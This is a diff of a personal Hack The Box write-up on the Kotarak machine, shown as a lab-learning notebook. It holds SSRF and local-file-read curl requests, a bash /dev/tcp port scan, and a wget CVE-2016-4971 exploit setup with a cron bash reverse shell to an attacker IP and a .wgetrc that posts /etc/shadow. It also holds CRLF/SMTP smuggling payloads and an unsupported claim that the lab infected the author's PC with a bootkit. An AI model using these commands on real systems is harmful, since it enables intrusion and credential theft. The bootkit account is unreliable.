@@ -8,9 +8,18 @@ Goals:
 - Female Neurodiversity for the assimilation
 Learnt:
 - Scrapping the brain pellets together to make the connection that with internal 127.0.0.1 we can fuzz  for ports for SSRF - never done that
+- Weaknesses and the way
+	- Piecing together the pieces more effectively:
+	- Fumbling objectives because I am not uses the upcoming - Notes and CMD-by-CMD only
+	- Reading details - or bad intuitive assumptions of remote hosting the exploit, because alots of exploits are run remotely that are like this as I have never had install pip packages - but I did not check for pyftpdlib
+	- `self.wfile.write(ROOT_CRON)`  has to have the permission to write the cron
+	- Double checking before running
+- engrampa to read zips without openning 
 Beyond Root:
-- Linux Malware in C and detections for Rootkits and Malware
+- Linux Malware in C/Rust and detections for Rootkits and Malware
 - Best FTP server
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/yOxk3JghqCk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 [areyou0or1](https://www.youtube.com/watch?v=yOxk3JghqCk) is OSCP, OSCE, SLAE64, OSWP, CCP. OSEE and the Senior Vulnerable Machine Engineer at Offsec. She is awesome in probably every possible way. If I find anymore female youtubers like this I would be a lucky fool.
 
@@ -19,6 +28,10 @@ Her videos are less than 20 minutes long - meaning:
 - Only relevant no fluff information - no memes, just chill, pure straight forward for the jugular.
 - I have to pause a figure out how should I answer this part and or why did she think that? - Building on your own patterns of thought.  
 
+I was going to keep it to this, but I [Ippsec](https://www.youtube.com/watch?v=38e-sxPWiuY) has unintentional methods I want to try also:
+<iframe width="560" height="315" src="https://www.youtube.com/embed/38e-sxPWiuY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
+Ippsec in his introductory statement directs viewers to [Orange Tsai - orangetw](https://github.com/orangetw) and very has a a convenient backdoor named [tsh](https://github.com/orangetw/tsh) , but more importantly for the inital attack vector talks on complex SSRF attack that lead to code execution. I decided to watch [DEF CON 25 - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languagues](https://www.youtube.com/watch?v=VlNA0BPpQpM). See Beyond Root Section!
 
 
 ## Recon
@@ -38,12 +51,34 @@ The time to live(ttl) indicates its OS. It is a decrementation from each hop bac
 
 ![](urlparam.png)
 
+Ippsec approach mixed with mine 
+```bash
+python3 -m http.server 8888
+curl -X GET 'http://10.129.1.117:60000/url.php?path=http://10.10.14.29:8888/hellothere'
+```
+
+![1080](widescreenpocssrf.png)
+
+Local File inclusion with `file://`
+```bash
+curl -X GET 'http://10.129.1.117:60000/url.php?path=file:///etc/passwd'
+# Check no where it errors out
+curl -X GET 'http://10.129.1.117:60000/url.php?path=file'
+curl -X GET 'http://10.129.1.117:60000/url.php?path=fil'
+```
+Ippsec and I are told to try harder.
+![](tryharderippsec.png)
+
+A brief segway as learning the power of phpfilters was like:
+<iframe width="560" height="315" src="https://www.youtube.com/embed/R2Iih-Ch57w" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+[Unfortunately I am not even close to this even among other humans...](https://www.youtube.com/watch?v=NPGUIpv-JxI) from my notes it discusses `include` and the design of the site probably is not looking to `include` the internet. 
+
 Parameter equals:
 ![](fieldtotheparam.png)
 
 - What data returns from the testing the parameter
 	- LFI? Can you read disk/memory?
-	- RFI? Can you get remote resources?
+	- RFI? Can you get remote resources? - Internal && External
 	- SSRF? Can you request known resources - ports, files, webpages?
 	- XSS? Can you execute javascript scripting?
 	- SSTI? Can you exploit the template engines access to system?
@@ -122,6 +157,13 @@ unzip kalisa.war
 ```
 
 ![](bursaisawesome.png)
+
+For the final run with Ippsec
+```bash
+# engrampa to note the .jsp file for calling the reserver shell with minimal filesystem
+engrampa kalisa.war # vegezcdnllksu.jsp
+engrampa asilak.war # qbfwxhqoqgtfbd.jsp
+```
 
 Start playing [Primus's Tommy the cat](https://www.youtube.com/watch?v=r4OhIU-PmB8) 
 ![](wearetomcat.png)
@@ -214,7 +256,7 @@ Just why?
 First thing was check if root can ssh in
 ![](yesbutno.png)
 
-Interesting I pausethe video as I wanted to atleast fail for a good thirty minutes on this very intersting machine.
+Interestingly I paused the video as I wanted to atleast fail for a good thirty minutes on this very intersting machine.
 ![](archivestowget.png)
 
 - There is nmap on the box - but we have troll, so no nmap cli
@@ -293,7 +335,7 @@ Ok OSCP - always check the versions  and BEWARE of PrivEsc rabbit holes - it is 
 [potential RCE](https://www.exploit-db.com/exploits/40064) - I pause to read and try without help.
 ```txt
 GNU Wget before 1.18 when supplied with a malicious URL (to a malicious or 
-compromised web server) can be tricked into saving an arbitrary remote file 
+compromised web server) can be tricked lxcinto saving an arbitrary remote file 
 supplied by an attacker, with arbitrary contents and filename under 
 the current directory and possibly other directories by writing to .wgetrc.
 ... 
@@ -325,8 +367,10 @@ post_file = /etc/shadow
 output_document = /etc/cron.d/wget-root-shell
 _EOF_
 # Or another ftp method
-attackers-server# sudo pip install pyftpdlib
-attackers-server# python -m pyftpdlib -p21 -w
+# Legacy:
+# attackers-server# sudo pip install pyftpdlib
+attackers-server# sudo apt install python3-pyftpdlib
+attackers-server# python3 -m pyftpdlib -p21 -w
 ```
 
 - Python2 exploit..
@@ -334,7 +378,9 @@ attackers-server# python -m pyftpdlib -p21 -w
 # for complete research and reading sake 
 searchsploit -m linux/remote/49815.py
 searchsploit -m linux/remote/40064.txt
+# Made a 40064.py
 ```
+
 
 TL;DR - For The FeynmanWin
 
@@ -347,12 +393,201 @@ As a server requested by a victim with the CVE-2016-4971 vulnerable version of w
 [wgetrc commands documentation](https://www.gnu.org/software/wget/manual/wget.html#Wgetrc-Commands)
 
 
+I initial tried with the original exploit but it errored out on the server so I tried the other and both failed. My mistake was reading and fixation. Coming back I understood what I was doing wrong:
+
+- Where are we sending the cron? = 10.0.3.133
+![](checkingtomakesureIdosomethingbad.png)
+
+Port scanning with bash
+```bash
+for port in $(seq 1 65535); do (echo Hello > /dev/tcp/10.0.3.133/$port && echo "open - $port") 2> /dev/null; done
+```
+
+Resulted in: 
+![](itisopenon22.png)
+
+Changes to the 40064.py
+```python
+# Changes
+HTTP_LISTEN_IP = '10.10.14.29'
+HTTP_LISTEN_PORT = 10000
+FTP_HOST = '10.10.14.29'
+FTP_PORT = 21
+
+ROOT_CRON = "* * * * * root bash -c \'bash -i >& /dev/tcp/$ip/$port 0>&1\'\n"
+```
+
+Kotarak:
+```bash
+curl http://10.10.14.29/40064.py -o /tmp/40064.py
+python2 40064.py
+```
+
+```bash
+rlwrap ncat -lvnp 10003
+python3 -m pyftpdlib -p21 -w
+```
+
+Clear the clipboard
+```bash
+echo -n | xsel -b
+echo -n | xclip -in
+```
+
+It resulted just recieving index.html in /root and no cron, I fixed the escaping the quotes in the cronjob 
+![](removeswgetrc.png)
+But is not removing it. The script does not seem to write the cron either. servee_forever is [real](https://docs.python.org/2.7/library/socketserver.html). Tried putting the wgetrc in atanas's home directory
+![](wgetrcinatanashome.png)
+
+I watched the video and Ippsec runs it from the box.. also it takes awhile. 
+
+```python
+# Changes
+HTTP_LISTEN_IP = '0.0.0.0'
+HTTP_LISTEN_PORT = 80
+FTP_HOST = '10.129.200.66'
+FTP_PORT = 21
+
+ROOT_CRON = "* * * * * root bash -c \'bash -i >& /dev/tcp/$ip/$port 0>&1\'\n"
+```
+
+I realised that I had problems with this machine months ago and remembered being stuck with understand and read 0xdf writeup. 
+![](piecebypiece.png)
+![](multiattempts.png)
+
+And with root, I must address the piecing together pieces for the final part of this machine failed multiple times on multiple aspects of each attempt.
+![](root.png)
+
+Firstly my excuse: 
+- In March I attempted this box and ended up with a bootkit and probably still do. 
+	- It starts as a rootkit
+	- I tested it and found my machine make calls out during no power
+- I saved the on usb that I stashed to forensically analyze on day along with everything else because of compromised here [[Kotarak-Recovery]]
+
+### I am hacked
+
+Even though this does not bother my it seems pretty good at what it does and got me interesting in that technology. It is absolutely human operated and I had heard from Nahamsec podcast of a guest that would never use HTB because it scared him. 
+
+I have nothing of value other than the motherboard and other hardware it would have concatinated as if you going to drop bootkits and them work well. I consider all hardware that had any power running through it as forfeit till have a job that pays the kind of money to afford more hardware.
+
+I would feel bad selling it to someone, but it could have anti-forensic capabilities and brink the board even if I was persistent enough or good enough to get a good job to just spend money on all my hardware again. 
+
+I have to reveal it somewhere public for legal reasons encase I get used or I am being used for whatever reason.
+
+Continued Migitations being:
+- Download a fresh VPN key each time you use HTB...
+- VMs wont save you, if you having a bootkit and rootkit dropped - no hardware is safe unless is has no power running through it
+- No personal projects you would not want whomever the bootkit belongs to anywhere near - no change there
+- No cross contamination
+- Only use this PC as I was using it for anyway
+	- Faraday Cage for PC and al-possible-types-of-gaps-network-seperated-internet 
+	- Quantine all touching and accessible with power hardware 
+		- If I could afford a new PC I could afford a forensics lab
+			- If possible copy all firmware without **current or PSU** and reimage with fresh firmware
+- I do not think anyone would take me seriously so if had enough status I would, but I will warn people about. 
+
+```
+Dont use your production PC to connect to HTB Network  
+We strongly recommend not to use your production PC to connect to the >HTB Network. Build a VM or physical system just for this purpose. HTB >Network is filled with security enthusiasts that have the skills and toolsets >to hack systems and no matter how hard we try to secure you, we are likely >to fail ![:stuck_out_tongue:](https://emoji.discourse-cdn.com/twitter/stuck_out_tongue.png?v=12 ":stuck_out_tongue:") We do not hold any responsibility for any damage, theft or loss of >personal data although in such event, we will cooperate fully with the >authorities.
+```
+
+## Lessons regardless of re-reading 
+
+Anyway enough excuse making - more explaining the weird continuity - especially as the coherence of [[Kotarak-Recovery]] does not demonstrate understand of the exploit.
+
+Areas of weakness:
+- Piecing together the pieces more effectively:
+	- cronjob
+	- authbind for second time for both ftp and http server
+	- exploit has to be run from the target machine, because of the cronjob
+	- pyftpdlib is on the box
+	- .wgetrc need to belong to root! 
+	- we are not in the lxc group 
+	- kotarak-dmz `/proc/net/arp` shows contact with kotarak-int 
+- Fumbling objectives because I am not uses the upcoming - Notes and CMD-by-CMD only
+- Reading details - or bad intuitive assumptions of remote hosting the exploit, because alots of exploits are run remotely that are like this as I have never had install pip packages - but I did not check for pyftpdlib
+	- `self.wfile.write(ROOT_CRON)`  has to have the permission to write the cron
+- Double checking before running
+
+Over the upcoming weeks to fix had plans to do 14 machines with no-writeup assistance
+- Notes and CMD-by-CMD only - use creenshot_and_report_format_loader.sh
+- Marshall data better and make it visibile
+	- "PrivEsc/FootHold - pieces" 
+		-  ie cronjob, wget vulnerable, authbind and pyftpdlib is on the box
+	 - Requirements lists for exploitation chains
+	 - Add comments to the modified exploit code so that I understand and have question what it is doing in the context of the box.
+- Read exploit twice and once after changes
+kotarak
+I will return in two weeks for [Ippsec unintended way](https://www.youtube.com/watch?v=38e-sxPWiuY) and the beyond roots
 
 ## Beyond Root
 
-[Jacob Sorber Programming with Processes](https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw), I watched the Sending and Handlign Signals in C video
+#### While eating and watching xct
+
+Watch [xct](https://www.youtube.com/watch?v=w2K-bQNs3cg) speed through Bankrobber on HTB and having recently finished the 13 Day [[Reddish-Helped-Through]] of absolute incredible learning and growth; xct waps out pwntools to create an interactive shell to interact with [ssf](https://github.com/securesocketfunneling/ssf) a c++ tunneling application with tls.  Although I have seen this awhile ago it struck me as something to quickly revise and copy. More ways to interact and try understand python. pwntools has become my favourite python library also one where the documentation is not written by the same team that write and format the washing machine manual terms and condition sections.
+
+```python
+from pwn import *
+
+context.proxy = (sock.SOCK4, localhost, 9090)
+# Functional code can start here
+p = remote('localhost', 910, level='info')
+# Functional code does here
+# Then end with p.interactive() 
+p.interactive()
+```
+
+
+#### Monolith continuation - aka  Rogue Server Stack of Doom
+
+[[Kotarak-Server-Plan]]
+
+https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw
+https://www.youtube.com/playlist?list=PL9IEJIKnBJjH_zM5LnovnoaKlXML5qh17
+
+[Jacob Sorber Programming with Processes](https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw), I watched the Sending and Handling Signals in C video
 
 ```c 
 
 sigaction
 ```
+
+####  tsf 
+
+https://github.com/orangetw/tsh
+
+#### Orange Tsai Talk
+
+I decided to watch [DEF CON 25 - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languagues](https://www.youtube.com/watch?v=VlNA0BPpQpM). See Beyond Root!
+- Protocol Smugging in SSRF
+	- HTTP based: Elastic, CounchDB, Mongodb, Docker,
+	- Text based: FTP, SMTP, Redis, [Memcached](https://en.wikipedia.org/wiki/Memcached) 
+
+Python treats the std library differently
+```python
+# Python is hard
+http://1.1.1.1[]&@2.2.2.2#[]@3.3.3.3
+# 1.1.1.1 - urlliub2 httplib
+# 2.2.2.2 - requests
+# 3.3.3.3 - urllib
+```
+
+CR-LF injection on HTTP protocol; Smuggling SMTP protocol over HTTP protocol - Server will close connection
+```
+GET /
+http://127.0.0.1:25%0%D%0AHELO oragne.tw%D%0AMAIL FROM...
+>> HELO orange.tw
+Connection closed
+```
+
+We focus on HTTP and HTTP(s) to smuggle as protocols then ask: What wont be encrypted in a SSL handshake? - over TLS SNI. Using a `\n` replacing `/`  between the domain name and port in previous exmaple to break up the message:
+```
+GET /
+http://127.0.0.1 %0%D%0AHELO oragne.tw%D%0AMAIL FROM...
+>> HELO orange.tw
+<< 250 ubuntu Hello Localhost [127.0.0.1], please to meet you
+>> MAIL FROM: <admin@orange.tw>
+<< 250 2.1.0 <admin@orange.tw>... Sender ok
+```
+
+11:11
